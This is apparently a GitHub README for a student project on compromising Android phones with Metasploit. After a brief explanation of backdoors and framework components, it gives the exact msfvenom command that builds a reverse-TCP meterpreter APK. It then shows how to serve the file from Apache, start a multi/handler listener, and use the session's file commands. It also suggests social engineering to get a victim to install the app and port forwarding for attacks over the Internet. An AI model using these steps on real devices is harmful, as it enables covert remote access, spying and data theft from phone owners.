# Hacking-Android-devices-using-Metasploit-Framework
Android hacking made easy with Metasploit framework - my project on exploiting vulnerabilities for penetration testing and ethical hacking.

## Introduction

A backdoor is any route by which someone can circumvent normal security measures to access a system. Pieces of software often come with backdoors built into their code so that engineers and developers can bypass their own defenses to fix problems for their users. Backdoor attacks involve cybercriminals using these entry points to gain unauthorized access to data and systems. These incidents often go undetected, at least at first, because the hackers didn’t have to disrupt or brute force their way through any of the cybersecurity systems. Once they’ve got remote access to a network or device, a bad actor can install malware, engage in data theft, and spy on user activity.

Backdoor attacks can be extremely dangerous because they often involve hackers gaining an extremely high level of access and privileges within a system or network. If they can do this without being detected, they can then squat there for months, monitoring user activity.
An exploit is a code that takes advantage of a software vulnerability or security flaw. It is written either by security researchers as a proof-of-concept threat or by malicious actors for use in their operations. When used, exploits allow an intruder to remotely access a network and gain elevated privileges, or move deeper into the network. In some cases, an exploit can be used as part of a multi-component attack. Instead of using a malicious file, the exploit may instead drop another malware, which can include backdoor Trojans and spyware that can steal user information from the infected systems.

## Features of Metasploit Framework:

The Metasploit framework is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers. Because it’s an open-source framework, it can be easily customized and used with most operating systems.

Due to its wide range of applications and open-source availability, Metasploit is used by everyone from the evolving field of DevSecOps pros to hackers. It’s helpful to anyone who needs an easy to install, reliable tool that gets the job done regardless of which platform or language is used. The software is popular with hackers and widely available, which reinforces the need for security professionals to become familiar with the framework even if they don’t use it.

1.	Exploit: Tool used to take advantage of system weaknesses.
2.	Payloads: Sets of Malicious code.
3.	Auxiliary functions: Supplementary tools and commands
4.	Encoders: Used to convert code to information
5.	Listeners: Malicious software that hides in order to gain access
6.	Shellcode: Code that is programmed to activate once inside the target.
7.	Post-exploitation code: Helps test deeper penetration once inside
8.	Nops: An instruction to keep the payload from crashing. 

IMPLEMENTATION:


1.	Generating a Payload with msfvenom
Start Kali Linux so that we may generate an apk file as a malicious payload. We need to check our local IP that turns out to be ‘192.168.0.112’. You can also hack an Android device through Internet by using your Public/External IP in the LHOST and by port forwarding.
 
 ![image](https://user-images.githubusercontent.com/81562207/229279048-8c5be979-a8ca-4f33-8755-44de904783ae.png)

After getting your Local host IP use msfvenom tool that will generate a payload to penetrate the Android device. Type command:
#msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R> /var/www/html/ehacking.apk
Where:
-p indicates a payload type
android/metepreter/reverse_tcp specifies a reverse meterpreter shell would come in from a target Android device
LHOST is your local IP
LPORT is set to be as a listening port
R> /var/www/html would give the output directly on apache server
apk is the final name of the final output


2.	Launching an Attack
Before launching attack, we need to check the status of the apache server. Type command:
#service apache2 status
 
![image](https://user-images.githubusercontent.com/81562207/229279152-6b342062-523d-465a-830b-a9df37590b99.png)


All seems set, now type msfconsole. Use multi/handler exploit, set payload the same as generated prevoisly, set LHOST and LPORT values same as used in payload and finally type exploit to launch an attack.

![image](https://user-images.githubusercontent.com/81562207/229279200-5c74b081-2753-429c-9b2a-33892ecd2960.png)
 
In real life scenarios, some social engineering techniques can be used to let the target download the malicious apk file. For demonstration we are just accessing the attacker machine to download the file in the Android device. After downloading it successfully, select the app to install.

![image](https://user-images.githubusercontent.com/81562207/229279271-af872994-d2c1-42e3-9a75-51ab02caf6d2.png)

Once the user installs the application and runs it, the meterepreter session would be opened immediatly at the attacking side.

![image](https://user-images.githubusercontent.com/81562207/229279465-8336c901-4c06-47ff-a8a7-7105a96e3a52.png)


3.	Post Exploitation
Type “background” and then “sessions” to list down all the sessions from where you can see all the IPs connected to the machine. 

![image](https://user-images.githubusercontent.com/81562207/229279529-ca376327-0434-43b2-b1a4-19c526f87584.png)
 
You can interact with any session by typing sessions -i [session ID]. After entering the session, type “help” to list down all the commands we can put forward in this session. You can see some file system commands that are helpful when you’re trying to go after some sensitive information or data. By using these, you can easily download or upload any file or information.

![image](https://user-images.githubusercontent.com/81562207/229279569-43fff339-2ee2-4fd5-85dd-f54731ad92d6.png)


